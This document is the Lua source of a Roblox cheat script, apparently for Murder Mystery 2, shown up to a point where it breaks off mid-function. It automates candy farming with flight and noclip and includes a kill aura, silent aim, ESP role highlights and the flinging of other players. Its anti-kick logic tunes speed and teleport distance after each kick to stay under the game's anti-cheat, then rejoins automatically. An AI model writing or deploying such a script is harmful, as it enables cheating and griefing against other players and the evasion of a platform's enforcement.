-- CandyFarm v11 — fusion v10 + v11
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")

if not game:IsLoaded() then game.Loaded:Wait() end

local players = game:GetService("Players")
local localPlayer = players.LocalPlayer
while not localPlayer do
    task.wait()
    localPlayer = players.LocalPlayer
end
localPlayer:WaitForChild("PlayerGui", 30)

-- Dernière position connue (détection des gros TP du serveur)
local lastKnownPosition, charAddedT = nil, 0
task.spawn(function()
    local char = localPlayer.Character or localPlayer.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart", 10)
    if hrp then lastKnownPosition = hrp.Position end
end)
localPlayer.CharacterAdded:Connect(function(char)
    charAddedT = os.clock()
    local hrp = char:WaitForChild("HumanoidRootPart", 10)
    if hrp then lastKnownPosition = hrp.Position end
end)

local Lib = "1bzableLib"
local LibVersion = "v4"

-- CTX : état et fonctions "indépendantes" (limite de 200 variables locales)
local CTX = {
    SETTINGS_FILE = "CandyFarm_settings.json",
    uiReady = false,
    cfgDirty = false,
    cfgDirtyT = 0,
    voting = false,     -- vote de map en cours
    psSet = false,      -- PlatformStand posé par le script
    map = "Aucune",     -- dernière map votée
    hopping = false,
    soloT = nil,
    hidden = {fade = false, score = false},
    combat = {
        attacked = {},
        killedSet = {},
        finalT = 0,
        finalV = false,
        finalStartT = 0,
        flagFinal = false,
        shotCache = setmetatable({}, {__mode = "k"}),
    },
}

local UILib
local UIREG = {}   -- clé CFG -> contrôle UI (pour "Restaurer les valeurs par défaut")
local function pushLog(tag, msg) print("[" .. tag .. "] " .. msg) end

local CFG = {
    AntiFling = true,            -- Anti-Fling intelligent hors-manche
    ForceRejoinOnLoading = true, -- Rejoint si l'écran "Loading" reste bloqué + de 20 s

    Enabled = true,
    SpinSpeed = 500,
    RotModes = "Spin",          -- Spin / Roue 360 / Couché (plusieurs possibles, séparés par des virgules)
    Flick360Interval = 0,       -- tour brutal toutes les X secondes (0 = off)
    CollectMethod = "Vol",      -- Vol / TP par saut
    TPJumpInterval = 1.8, TPJumpMax = 30, TPJumpSpeed = 150,
    YOffset = -5,               -- décalage vertical par rapport au bonbon
    Speed = 25,        -- vitesse constante (studs/s)
    SpeedVar = 1,      -- alterne Speed / Speed - SpeedVar entre chaque bonbon
    Turn = 320,        -- virage max (°/s)
    TouchR = 20,       -- rayon de touch en continu
    MissDist = 6,      -- distance de dépassement avant demi-tour sec
    SafeDepth = 150, FullAt = 50,
    Cluster = true, ClusterR = 30, ClusterW = 3, AheadW = 8,
    AvoidFriendRadius = 50, AvoidFriendWeight = 150, -- évite les bonbons proches des amis
    Boost = true, BoostMult = 1.5, BoostN = 3, BoostR = 20, BoostMax = 2.5, BoostCool = 10,
    TPFar = true, TPDist = 150,
    Killer = true, KillerR = 25,
    KillerHunt = true,          -- menace seulement si elle tient un Tool
    NoClipMode = "Stepped",     -- Off / Stepped / Touched
    NoClip = true, NoClipTouched = false,
    Ghost = true, GhostR = 20,
    PlatformStand = true,       -- PlatformStand pendant tout ce que le script contrôle
    AnchorIdle = true,          -- HRP ancré entre deux bonbons (quand il n'y a pas de cible)
    AutoRejoin = true,
    RejoinOnAnyError = true,    -- rejoint aussi sur une autre erreur que les mots-clés
    KickKeywords = "invalid,position", -- mots-clés identifiant un vrai kick du jeu
    Hitbox = true,
    Debug = true,
    -- Divers
    AutoPlay = true, AutoGun = true, Notify = true,
    Friends = "nahhhhhhhh2adqsd, Mohale_san, Noob_LeTricheur",
    IgnoreFriends = true,       -- ne pas éviter les amis
    KA = true, KARange = "Toute la map", KARadius = 20, KASheriff = "Toujours",
    KAInterval = 0.25, KAEquip = false, KAStab = true,
    KAAssassin = true, KABurst = 1,
    SA = true, SAWhen = "Sac plein", SAPart = "Torse", SAOrder = "Cible, Origine", SAInterval = 0.1,
    PreventEarlyKill = true,
    FinalKill = true, FinalDelay = 5, MaxLevel = 100,
    FlingEnd = true, FlingTargets = "Murder + Sheriff", FlingTime = 5,
    TouchFling = true, TouchFlingR = 10,
    HideFades = true,          -- supprime flashs / fades du jeu
    HideScoreboard = true,     -- supprime le scoreboard de fin (PC + mobile)
    SoloHop = true, SoloHopSecs = 120, -- server hop si seul trop longtemps
    HL = true, HLSelf = true, HLInnocent = true, HLFriends = true, HLFill = 0.65, HLOutline = 0.1,
    LeaderTrack = true,
    RoundMinutes = 3,
    -- Manche / zone secrète
    UseAlive = true,            -- attribut Player "Alive" = en manche
    PhaseUseWaiting = true,     -- confirme le TP avec l'image PlayerGui.MainGUI.Game.Waiting
    PhaseTPDist = 100,          -- saut de position (studs) considéré comme un TP serveur
    PreZone = true, PreHide = "Zone secrète", PreMin = 5, PreMax = 25, -- Zone secrète / Sous la map / Aucun
    HideMode = "Sous la map",   -- planque quand le sac est plein : Sous la map / Zone secrète
    ZoneMode = "Relatif au Lobby", ZoneText = "0, 700, 0", ZoneRadius = 60,
    AutoFriends = true, HandshakeMin = 2,
    -- Votes de map
    VoteBot = true, VoteReset = true, VoteList = "Mansion, office 3, hospital 3, milbase, Vampire castle, house 2, Manor, factory, workplace, Research facility, biolab, farmbarn, hotel 2, infection barn, Spaceship, Mineshaft, police station, bank 2", VoteFallback = "Aucun vote", VoteTimeout = 5, VoteStay = 0.25,
}

local COL = {
    Murder = Color3.fromRGB(255, 0, 0),
    Sheriff = Color3.fromRGB(0, 0, 255),
    Innocent = Color3.fromRGB(255, 255, 255),
    Friend = Color3.fromRGB(0, 255, 120),
    Target = Color3.fromRGB(255, 150, 0),   -- ta cible en mode Assassin (info seulement)
}

-- Valeurs par défaut (copie avant chargement des réglages sauvegardés)
local DEFAULTS, COL_DEFAULT = {}, {}
for k, v in pairs(CFG) do DEFAULTS[k] = v end
for k, v in pairs(COL) do COL_DEFAULT[k] = v end

-- ===== État persistant (stats) : getgenv + fichier =====
local STATE_FILE = "CandyFarm_state.json"
local S = getgenv().CandyState
if type(S) ~= "table" then
    S = {boostPen = 0, speedPen = 0, tpPen = 0, kicks = 0}
    pcall(function()
        if isfile and isfile(STATE_FILE) then
            for k, v in pairs(HttpService:JSONDecode(readfile(STATE_FILE))) do S[k] = v end
        end
    end)
    getgenv().CandyState = S
end
S.kicks = tonumber(S.kicks) or 0
S.boostPen = tonumber(S.boostPen) or 0
S.speedPen = tonumber(S.speedPen) or 0
S.tpPen = tonumber(S.tpPen) or 0
S.life = S.life or {}
local function saveState()
    pcall(function() if writefile then writefile(STATE_FILE, HttpService:JSONEncode(S)) end end)
end

-- ===== Réglages persistants (JSON) =====
local function markDirty()
    if CTX.uiReady then CTX.cfgDirty, CTX.cfgDirtyT = true, os.clock() end
end

local function saveSettings()
    local data = {cfg = {}, col = {}}
    for k, v in pairs(CFG) do
        local tv = type(v)
        if tv == "number" or tv == "string" or tv == "boolean" then data.cfg[k] = v end
    end
    for k, c in pairs(COL) do data.col[k] = {c.R, c.G, c.B} end
    getgenv().CandyCFGSave = data
    pcall(function()
        if writefile then writefile(CTX.SETTINGS_FILE, HttpService:JSONEncode(data)) end
    end)
end

local function loadSettings()
    local data
    pcall(function()
        if isfile and isfile(CTX.SETTINGS_FILE) then data = HttpService:JSONDecode(readfile(CTX.SETTINGS_FILE)) end
    end)
    data = data or getgenv().CandyCFGSave
    if type(data) ~= "table" then return false end
    if type(data.cfg) == "table" then
        for k, v in pairs(data.cfg) do
            if DEFAULTS[k] ~= nil and type(v) == type(DEFAULTS[k]) then CFG[k] = v end
        end
    end
    if type(data.col) == "table" then
        for k, v in pairs(data.col) do
            if COL[k] and type(v) == "table" and #v == 3 then COL[k] = Color3.new(v[1], v[2], v[3]) end
        end
    end
    return true
end

local settingsLoaded = loadSettings()
CFG.NoClip = CFG.NoClipMode ~= "Off"
CFG.NoClipTouched = CFG.NoClipMode == "Touched"

function CTX.effSpeed()
    return math.max(math.min(CFG.Speed, 15), CFG.Speed - S.speedPen)
end
function CTX.effBoost()
    return math.max(math.min(CFG.BoostMult, 1.1), CFG.BoostMult - S.boostPen)
end
function CTX.effTP()
    return CFG.TPDist + S.tpPen
end

local lastAct, lastActT, lastTick = "move", 0, os.clock()

-- ===== Stats =====
local sessionStart = os.clock()
local ST = {candies = 0, kills = 0, rounds = 0, guns = 0, votes = 0, asMurder = 0, asSheriff = 0, asInnocent = 0}
local statDirty = false
local function stat(k, n)
    -- Statistiques défensives : une clé absente ne doit jamais casser la boucle.
    if type(k) ~= "string" or k == "" then return end
    n = tonumber(n) or 1
    ST[k] = (tonumber(ST[k]) or 0) + n
    if type(S.life) ~= "table" then S.life = {} end
    S.life[k] = (tonumber(S.life[k]) or 0) + n
    statDirty = true
end

-- ===== Amis / notifications =====
local friendSet, autoFriends = {}, {}   -- autoFriends : nom en minuscules -> vrai nom
local function parseFriends(txt)
    friendSet = {}
    for name in tostring(txt):gmatch("[^,%s]+") do friendSet[name:lower()] = true end
end
parseFriends(CFG.Friends)
local function isFriend(p)
    local n = typeof(p) == "Instance" and p.Name or tostring(p)
    n = n:lower()
    return friendSet[n] == true or autoFriends[n] ~= nil
end

local function notify(title, content, t)
    print("[NOTIF] " .. title .. " : " .. content)
    if CFG.Notify and UILib then
        pcall(function() UILib:MakeNotification({Name = title, Content = content, Time = t or 6}) end)
    end
end

local BIG = Vector3.new(9e9, 9e9, 9e9)
local targetModel = workspace:FindFirstChild("CoinContainer", true)
local banned = {}
local nc = false           -- noclip actif (vol / planque)
local hiding = false       -- planque (sac plein)
local zoneActive = false   -- pré-manche : zone secrète / sous la map

getgenv().FPDH = workspace.FallenPartsDestroyHeight
workspace.FallenPartsDestroyHeight = 0/0

-- ===== Utilitaires CTX =====
function CTX.anchor(hrp, v)
    if hrp and hrp.Parent and hrp.Anchored ~= v then hrp.Anchored = v end
end

function CTX.getTokens()
    local pg = localPlayer:FindFirstChild("PlayerGui")
    if not pg then return "0" end
    
    -- Utilisation du chemin exact trouvé dans l'explorateur du jeu
    local o = pg
    local path = {"CrossPlatform", "Halloween2026", "MainEvent", "Main", "ShopBundles", "Title", "Tokens", "Container", "TextLabel"}
    
    for _, name in ipairs(path) do
        o = o and o:FindFirstChild(name)
        if not o then break end
    end
    
    if o and o:IsA("TextLabel") then
        -- Nettoie le texte pour ne garder que les chiffres si besoin
        return tostring(o.Text)
    end
    
    -- Heuristique de secours alternative si le chemin principal a échoué
    local alt = pg:FindFirstChild("TextLabel", true) -- Recherche récursive si nécessaire
    return "En attente..."
end

-- PlatformStand : actif pendant tout ce que le script contrôle (vol, planque, zone, vote)
RunService.Heartbeat:Connect(function()
    local ch = localPlayer.Character
    local hum = ch and ch:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    local on = CFG.PlatformStand and (nc or hiding or zoneActive or CTX.voting)
    if on then
        if not hum.PlatformStand then hum.PlatformStand = true end
        CTX.psSet = true
    elseif CTX.psSet then
        CTX.psSet = false
        hum.PlatformStand = false
    end
end)

-- ===== Masquer fades / flashs / scoreboard (toggles) =====
local function hideGroups(group)
    local pg = localPlayer:FindFirstChild("PlayerGui")
    local ps = localPlayer:FindFirstChild("PlayerScripts")
    local list = {}
    if group == "fade" then
        list[#list + 1] = {pg, {"CameraFade", "Fade", "SpawnFade"}}
        local ga = ps and ps:FindFirstChild("GameplayAnimations")
        list[#list + 1] = {ga, {"DeathFade"}}
        local mg = pg and pg:FindFirstChild("MainGUI")
        list[#list + 1] = {mg and mg:FindFirstChild("Game"), {"Fade"}}
    else
        list[#list + 1] = {pg, {"Scoreboard", "Scoreboard_Phone"}}
    end
    return list
end

function CTX.setHidden(group, on)
    CTX.hidden[group] = on
    for _, e in ipairs(hideGroups(group)) do
        local parent, names = e[1], e[2]
        if parent then
            for _, n in ipairs(names) do
                if on then
                    for _, o in ipairs(parent:GetChildren()) do
                        if o.Name == n then
                            pcall(function()
                                if o:IsA("ScreenGui") or o:IsA("LocalScript") then o.Enabled = false
                                elseif o:IsA("GuiObject") then o.Visible = false end
                                o.Name = "Hidden" .. n
                            end)
                        end
                    end
                else
                    for _, o in ipairs(parent:GetChildren()) do
                        if o.Name == "Hidden" .. n then
                            pcall(function()
                                o.Name = n
                                if o:IsA("ScreenGui") or o:IsA("LocalScript") then o.Enabled = true
                                elseif o:IsA("GuiObject") then o.Visible = true end
                            end)
                        end
                    end
                end
            end
        end
    end
end

task.spawn(function()
    -- Le jeu recrée Fade / Scoreboard à chaque manche : on réapplique en continu
    while true do
        task.wait(0.5)
        if CFG.HideFades then pcall(CTX.setHidden, "fade", true)
        elseif CTX.hidden.fade then pcall(CTX.setHidden, "fade", false) end
        if CFG.HideScoreboard then pcall(CTX.setHidden, "score", true)
        elseif CTX.hidden.score then pcall(CTX.setHidden, "score", false) end
    end
end)

-- ===== Server hop (liste publique, évite le serveur actuel et les derniers visités) =====
function CTX.serverHop(reason)
    if CTX.hopping then return end
    CTX.hopping = true
    task.spawn(function()
        local visited = getgenv().CandyVisited or {}
        getgenv().CandyVisited = visited
        visited[game.JobId] = os.clock()
        local pool, cursor = {}, nil
        for _ = 1, 3 do
            local url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true"
                .. (cursor and ("&cursor=" .. cursor) or "")
            local ok, body = pcall(function() return HttpService:JSONDecode(game:HttpGet(url)) end)
            if not ok or type(body) ~= "table" or type(body.data) ~= "table" then break end
            for _, v in ipairs(body.data) do
                if type(v) == "table" and v.id ~= game.JobId and not visited[v.id]
                    and tonumber(v.playing) and tonumber(v.maxPlayers)
                    and v.playing >= 2 and v.playing < v.maxPlayers - 1 then
                    pool[#pool + 1] = v.id
                end
            end
            cursor = body.nextPageCursor
            if not cursor or #pool >= 20 then break end
        end
        if #pool == 0 then
            CTX.hopping = false
            notify("Server hop", "Aucun serveur trouvé", 4)
            return
        end
        for i = #pool, 2, -1 do
            local j = math.random(i)
            pool[i], pool[j] = pool[j], pool[i]
        end
        notify("Server hop", (reason or "Changement de serveur") .. " (" .. #pool .. " serveurs)", 4)
        local idx = 1
        local failConn
        failConn = TeleportService.TeleportInitFailed:Connect(function(pl)
            if pl ~= localPlayer then return end
            idx += 1
            if idx > math.min(#pool, 6) then
                failConn:Disconnect()
                CTX.hopping = false
                return
            end
            visited[pool[idx - 1]] = os.clock()
            pcall(function() TeleportService:TeleportToPlaceInstance(game.PlaceId, pool[idx], localPlayer) end)
        end)
        pcall(function() TeleportService:TeleportToPlaceInstance(game.PlaceId, pool[idx], localPlayer) end)
        task.delay(60, function() CTX.hopping = false end)
    end)
end

-- Seul dans le serveur trop longtemps : on change de serveur
task.spawn(function()
    while true do
        task.wait(1)
        if CFG.SoloHop and #players:GetPlayers() <= 1 then
            CTX.soloT = CTX.soloT or os.clock()
            if os.clock() - CTX.soloT >= CFG.SoloHopSecs then
                CTX.soloT = nil
                CTX.serverHop("Seul dans le serveur")
            end
        else
            CTX.soloT = nil
        end
    end
end)

-- ===== Anti-kick : lecture fiable du message + rejoin =====
do
local CoreGui = game:GetService("CoreGui")
local processedPrompts = setmetatable({}, {__mode = "k"})

local function nettoyerTexte(text)
    return (tostring(text or ""):gsub("^%s+", ""):gsub("%s+$", ""))
end

local function estPlaceholder(text)
    text = nettoyerTexte(text):lower()
    return text == "" or text == "label" or text == "description" or text == "textlabel"
end

local function lireMessagePrompt(prompt)
    local deadline = os.clock() + 8
    local meilleurTexte = ""
    local debutTexte = nil

    while prompt.Parent and os.clock() < deadline do
        local area = prompt:FindFirstChild("MessageArea", true) or prompt

        for _, nom in ipairs({"ErrorErrorMessage", "ErrorMessage", "ErrorText", "MessageLabel"}) do
            local label = area:FindFirstChild(nom, true)
            if label and label:IsA("TextLabel") then
                local texte = nettoyerTexte(label.Text)
                if not estPlaceholder(texte) then return texte end
            end
        end

        local texteActuel = ""
        for _, objet in ipairs(area:GetDescendants()) do
            if objet:IsA("TextLabel") then
                local texte = nettoyerTexte(objet.Text)
                if not estPlaceholder(texte) and #texte > #texteActuel then texteActuel = texte end
            end
        end

        if texteActuel ~= "" then
            if texteActuel ~= meilleurTexte then
                meilleurTexte = texteActuel
                debutTexte = os.clock()
            elseif debutTexte and os.clock() - debutTexte >= 1 then
                return meilleurTexte
            end
        end

        task.wait(0.05)
    end

    return meilleurTexte
end

local function traiterPrompt(child)
    if child.Name ~= "ErrorPrompt" or processedPrompts[child] then return end
    processedPrompts[child] = true

    task.spawn(function()
        local okm, msg = pcall(lireMessagePrompt, child)
        msg = okm and nettoyerTexte(msg) or ""

        local low = msg:lower()
        local isKick = false
        for kw in tostring(CFG.KickKeywords):gmatch("[^,]+") do
            kw = kw:match("^%s*(.-)%s*$")
            if kw ~= "" and low:find(kw:lower(), 1, true) then
                isKick = true
                break
            end
        end

        pushLog("ANTI-KICK", "Message : " .. (msg ~= "" and msg or "(vide)") .. " | kick = " .. tostring(isKick))
        if isKick then
            S.kicks += 1
            if lastAct == "boost" then S.boostPen += 0.1
            elseif lastAct == "tp" then S.tpPen += 200
            else S.speedPen += 1 end
            saveState()
            pushLog("ANTI-KICK", "Kick pendant : " .. lastAct .. " (total " .. S.kicks .. ")")
        end

        if CFG.AutoRejoin and (isKick or CFG.RejoinOnAnyError) then
            task.wait(3)
            pcall(function() TeleportService:Teleport(game.PlaceId, localPlayer) end)
        end
    end)
end

task.spawn(function()
    local ok, overlay = pcall(function()
        local gui = CoreGui:WaitForChild("RobloxPromptGui", 30)
        return gui and gui:WaitForChild("promptOverlay", 30)
    end)
    if not ok or not overlay then
        warn("[REJOIN] Impossible de trouver promptOverlay.")
        return
    end
    overlay.ChildAdded:Connect(traiterPrompt)
    for _, child in ipairs(overlay:GetChildren()) do traiterPrompt(child) end
end)
end

-- ===== Sécurité Anti-Loading Screen Bug =====
task.spawn(function()
    if not game:IsLoaded() then game.Loaded:Wait() end
    task.wait(20)
    local pg = localPlayer:WaitForChild("PlayerGui", 10)
    if pg and pg:FindFirstChild("Loading") and CFG.ForceRejoinOnLoading then
        pushLog("SECURITY", "Écran 'Loading' détecté après 20s. Rejoin forcé...")
        pcall(function() TeleportService:Teleport(game.PlaceId, localPlayer) end)
    end
end)

-- ===== Frame Candy / sac =====
local function candyFrame()
    local g = localPlayer:FindFirstChild("PlayerGui")
    g = g and g:FindFirstChild("MainGUI")
    g = g and g:FindFirstChild("Game")
    g = g and g:FindFirstChild("CoinBags")
    g = g and g:FindFirstChild("Container")
    return g and g:FindFirstChild("Candy")
end

local function bagCount()
    local f = candyFrame()
    local icon = f and f:FindFirstChild("CurrencyFrame") and f.CurrencyFrame:FindFirstChild("Icon")
    local coins = icon and icon:FindFirstChild("Coins")
    return coins and tonumber(coins.Text)
end

-- Pas prêt : frame Candy invisible (manche déjà commencée / pas de manche) ou icône cachée (fin / mort)
local function isRoundOver()
    local f = candyFrame()
    if not f or not f.Visible then return true end
    local icon = f:FindFirstChild("CurrencyFrame") and f.CurrencyFrame:FindFirstChild("Icon")
    if icon then return not icon.Visible end
    return true
end

local function isBagFull()
    local f = candyFrame()
    if not f then return false end
    local n = bagCount()
    if f:FindFirstChild("Full") and f.Full.Visible == true and (not n or n > 0) then return true end
    return n ~= nil and n >= CFG.FullAt
end

local bagT, bagV = 0, false
local function bagFullCached()
    local now = os.clock()
    if now - bagT > 0.1 then bagT, bagV = now, isBagFull() end
    return bagV
end

-- ===== État de la partie (image "Waiting" en haut de l'écran) =====
local WAIT_ID, LOAD_ID = "189761558", "304416585"   -- "Waiting for your turn" / "Loading map..."
-- retourne (état affiché, type d'image) ; état = waiting / loading / other / hidden / unknown
local function waitingState()
    local pg = localPlayer:FindFirstChild("PlayerGui")
    local g = pg and pg:FindFirstChild("MainGUI")
    g = g and g:FindFirstChild("Game")
    local w = g and g:FindFirstChild("Waiting")
    if not w or not w:IsA("ImageLabel") then return "unknown", "unknown" end
    local img = tostring(w.Image)
    local kind = "other"
    if img:find(LOAD_ID, 1, true) then kind = "loading"
    elseif img:find(WAIT_ID, 1, true) then kind = "waiting" end
    if not w.Visible then return "hidden", kind end
    return kind, kind
end

-- ===== Mode Assassin (détection seulement : début de manche + surbrillance de la cible) =====
local function assassinTargetName()
    local pg = localPlayer:FindFirstChild("PlayerGui")
    local g = pg and pg:FindFirstChild("MainGUI")
    g = g and g:FindFirstChild("Game")
    local t3 = g and g:FindFirstChild("Target3")
    if t3 and t3.Visible then
        local lbl = t3:FindFirstChild("TargetName")
        if lbl and lbl.Text ~= "" then return lbl.Text end
    end
    return nil
end

local function obtenirModeActuel()
    local playerGui = localPlayer:FindFirstChild("PlayerGui")
    if not playerGui then return "Inconnu" end
    local modesFrame = playerGui:FindFirstChild("CrossPlatform")
        and playerGui.CrossPlatform:FindFirstChild("GameModes")
        and playerGui.CrossPlatform.GameModes:FindFirstChild("Container")
        and playerGui.CrossPlatform.GameModes.Container:FindFirstChild("Modes")
    if not modesFrame then return "Inconnu" end
    local assassinServer = modesFrame:FindFirstChild("Assassin")
        and modesFrame.Assassin:FindFirstChild("Info")
        and modesFrame.Assassin.Info:FindFirstChild("ModeIcon")
        and modesFrame.Assassin.Info.ModeIcon:FindFirstChild("CurrentServer")
    if assassinServer and assassinServer.Visible then return "Assassin" end
    return "Standard"
end

local function isAssassin()
    return assassinTargetName() ~= nil or obtenirModeActuel() == "Assassin"
end

-- ===== Rôles / manche / carte =====
local roles = {}
local myRoleCached = nil
local flagSheriffDead, flagGunDrop, flagAssassin = false, false, false
local noRoleSince = nil

local function hasTool(p, name)
    local ch = p.Character
    local t = ch and ch:FindFirstChild(name)
    if t and t:IsA("Tool") then return true end
    local bp = p:FindFirstChild("Backpack")
    return bp ~= nil and bp:FindFirstChild(name) ~= nil
end

local function roleNow(p)
    if hasTool(p, "Knife") then return "murder" end
    if hasTool(p, "Gun") then return "sheriff" end
    return nil
end

local function isAlive(p)
    local ch = p.Character
    local h = ch and ch:FindFirstChildOfClass("Humanoid")
    return h ~= nil and h.Health > 0 and ch:FindFirstChild("HumanoidRootPart") ~= nil
end

-- Heuristique de secours "en manche" : proche de la zone des bonbons
local mapCenter, mapRadius, mapFloorY = nil, nil, nil
local function updateMap(list)
    if #list < 3 then return end
    local miny = math.huge
    for _, c in ipairs(list) do
        if c.Position.Y < miny then miny = c.Position.Y end
    end
    mapFloorY = mapFloorY and math.min(mapFloorY, miny) or miny
    if not mapCenter and #list >= 8 then
        local sum = Vector3.zero
        for _, c in ipairs(list) do sum += c.Position end
        mapCenter = sum / #list
        local mr = 0
        for _, c in ipairs(list) do mr = math.max(mr, (c.Position - mapCenter).Magnitude) end
        mapRadius = mr + CFG.SafeDepth + 100
    end
end

-- En manche = attribut Player "Alive" == true (attribut absent = pas / plus en manche)
local aliveAttrSeen = false
local function inRound(p)
    if CFG.UseAlive then
        local a = p:GetAttribute("Alive")
        if a ~= nil then aliveAttrSeen = true end
        if aliveAttrSeen then return a == true end
    end
    local r = p.Character and p.Character:FindFirstChild("HumanoidRootPart")
    if not r then return false end
    if not mapCenter then return true end
    return (r.Position - mapCenter).Magnitude <= mapRadius
end

local function isUnderground(p)
    local r = p.Character and p.Character:FindFirstChild("HumanoidRootPart")
    return r ~= nil and mapFloorY ~= nil and r.Position.Y < mapFloorY - CFG.SafeDepth * 0.5
end

-- Lobby (boîte englobante du model workspace.Lobby)
local lobbyBox, lobbyBoxT = nil, 0
local function getLobbyBox()
    local now = os.clock()
    if now - lobbyBoxT > 1 then
        lobbyBoxT = now
        lobbyBox = nil
        local lob = workspace:FindFirstChild("Lobby")
        if lob and lob:IsA("Model") then
            local ok, cf, size = pcall(lob.GetBoundingBox, lob)
            if ok then lobbyBox = {cf = cf, size = size} end
        end
    end
    return lobbyBox
end

local function inLobbyPos(pos)
    local b = getLobbyBox()
    if not b then return false end
    local rel = b.cf:PointToObjectSpace(pos)
    local h = b.size / 2 + Vector3.new(30, 60, 30)
    return math.abs(rel.X) <= h.X and math.abs(rel.Y) <= h.Y and math.abs(rel.Z) <= h.Z
end

-- Zone secrète (relative au Lobby ou coordonnées fixes)
local function parseVec3(txt)
    local x, y, z = tostring(txt):match("(-?[%d%.]+)%s*,%s*(-?[%d%.]+)%s*,%s*(-?[%d%.]+)")
    if x then return Vector3.new(tonumber(x) or 0, tonumber(y) or 0, tonumber(z) or 0) end
    return nil
end

local zcT, zcV = 0, nil
local function zoneCenter()
    local now = os.clock()
    if zcV and now - zcT < 0.5 then return zcV end
    local v = parseVec3(CFG.ZoneText) or Vector3.new(0, 700, 0)
    if CFG.ZoneMode == "Relatif au Lobby" then
        local lob = workspace:FindFirstChild("Lobby")
        if lob then
            local ok, piv = pcall(lob.GetPivot, lob)
            if ok then v = piv.Position + v end
        end
    end
    zcT, zcV = now, v
    return v
end

local function zoneSlotOffset()
    local id = localPlayer.UserId
    return Vector3.new(((id % 5) - 2) * 3, 0, (((id // 5) % 5) - 2) * 3)
end

local function inZone(p)
    local r = p.Character and p.Character:FindFirstChild("HumanoidRootPart")
    return r ~= nil and (r.Position - zoneCenter()).Magnitude <= CFG.ZoneRadius
end

function CTX.levelOf(p)
    return tonumber(p:GetAttribute("Level"))
end

function CTX.isHiddenSpot(p)
    return isUnderground(p) or inZone(p)
end

function CTX.aliveOthers()
    local out = {}
    for _, pl in ipairs(players:GetPlayers()) do
        if pl ~= localPlayer and isAlive(pl) and inRound(pl) then
            out[#out + 1] = pl
        end
    end
    return out
end

function CTX.wouldEndRound(target)
    local out = CTX.aliveOthers()
    return #out == 1 and out[1] == target
end

-- ===== Highlights =====
local function removeHighlight(ch)
    local h = ch and ch:FindFirstChild("RoleHighlight")
    if h then h:Destroy() end
end

local function applyHighlight(ch, color)
    local h = ch:FindFirstChild("RoleHighlight")
    if not h then
        h = Instance.new("Highlight")
        h.Name = "RoleHighlight"
        h.Adornee = ch
        h.Parent = ch
    end
    if h.FillColor ~= color then
        h.FillColor = color
        h.OutlineColor = color
    end
    h.FillTransparency = CFG.HLFill
    h.OutlineTransparency = CFG.HLOutline
end

local function clearRound()
    for _, p in ipairs(players:GetPlayers()) do removeHighlight(p.Character) end
    roles = {}
    flagSheriffDead, flagGunDrop, flagAssassin = false, false, false
    CTX.combat.killedSet = {}
    CTX.combat.attacked = {}
    CTX.combat.flagFinal = false
    CTX.combat.finalV = false
    CTX.combat.finalStartT = 0
end

local function watchPlayers()
    task.spawn(function()
        while true do
            local ok, err = pcall(function()
                local any, mine = false, nil
                local assassin = isAssassin()
                local atarget = assassinTargetName()
                for _, p in ipairs(players:GetPlayers()) do
                    local r = roleNow(p)
                    if r then any = true end
                    if p == localPlayer then
                        mine = r
                    elseif r and isAlive(p) and roles[p.Name] ~= r then
                        roles[p.Name] = r
                        if not assassin then
                            local tag = isFriend(p) and " (ami)" or ""
                            if r == "murder" then notify("Murder détecté", p.Name .. tag, 5)
                            else notify("Sheriff détecté", p.Name .. tag, 5) end
                        end
                    end
                end
                myRoleCached = mine or (any and "innocent" or nil)

                if assassin and any and not flagAssassin then
                    flagAssassin = true
                    notify("Mode Assassin", "Cible : " .. (atarget or "?"), 6)
                end

                -- sheriff mort (le Gun tombe au sol)
                if any and not assassin and not flagSheriffDead then
                    for name, role in pairs(roles) do
                        if role == "sheriff" then
                            local p = players:FindFirstChild(name)
                            if not p or not isAlive(p) then
                                flagSheriffDead = true
                                notify("Sheriff mort", name .. " : le Gun est au sol", 5)
                                break
                            end
                        end
                    end
                end

                -- highlights : soi / amis / cible / murder / sheriff / innocents
                for _, p in ipairs(players:GetPlayers()) do
                    local ch = p.Character
                    local col
                    if CFG.HL and any and ch and isAlive(p) then
                        if p == localPlayer then
                            if CFG.HLSelf then
                                if myRoleCached == "murder" then col = COL.Murder
                                elseif myRoleCached == "sheriff" then col = COL.Sheriff
                                else col = COL.Innocent end
                            end
                        else
                            local role = roles[p.Name]
                            if CFG.HLFriends and isFriend(p) then col = COL.Friend
                            elseif atarget and p.Name == atarget then col = COL.Target
                            elseif role == "murder" then col = COL.Murder
                            elseif role == "sheriff" then col = COL.Sheriff
                            elseif CFG.HLInnocent and inRound(p) then col = COL.Innocent end
                        end
                    end
                    if col then applyHighlight(ch, col) elseif ch then removeHighlight(ch) end
                end

                -- fin de manche : plus aucun rôle pendant 4 s
                if any then
                    noRoleSince = nil
                else
                    noRoleSince = noRoleSince or os.clock()
                    if os.clock() - noRoleSince > 4 and next(roles) ~= nil then clearRound() end
                end
            end)
            if not ok then warn("[ROLES] " .. tostring(err)) end
            task.wait(0.3)
        end
    end)
end

-- ===== Leaderboard : 🟢 en vie / 🔴 mort dans la manche / ⚪ pas dans la manche =====
do
local EMO_ALIVE, EMO_DEAD, EMO_OUT = "🟢", "🔴", "⚪"
local wasIn = {}

local function stripEmoji(txt)
    for _, e in ipairs({EMO_ALIVE, EMO_DEAD, EMO_OUT}) do
        local pre = e .. " "
        if txt:sub(1, #pre) == pre then return txt:sub(#pre + 1) end
    end
    return txt
end

function CTX.trackLeaderboard()
    local pg = localPlayer:FindFirstChild("PlayerGui")
    local g = pg and pg:FindFirstChild("MainGUI")
    g = g and g:FindFirstChild("Game")
    g = g and g:FindFirstChild("Leaderboard")
    local cont = g and g:FindFirstChild("Container")
    if not cont then return end

    local ongoing = false
    for _, p in ipairs(players:GetPlayers()) do
        if p:GetAttribute("Alive") == true then ongoing = true break end
    end
    if not ongoing then wasIn = {} end

    for _, p in ipairs(players:GetPlayers()) do
        local fr = cont:FindFirstChild(p.Name)
        local lbl = fr and fr:FindFirstChild("PlayerLabel")
        if lbl and lbl:IsA("TextLabel") then
            local base = stripEmoji(lbl.Text)
            local want = base
            if CFG.LeaderTrack and ongoing then
                if p:GetAttribute("Alive") == true then
                    wasIn[p.Name] = true
                    want = EMO_ALIVE .. " " .. base
                elseif wasIn[p.Name] then
                    want = EMO_DEAD .. " " .. base
                else
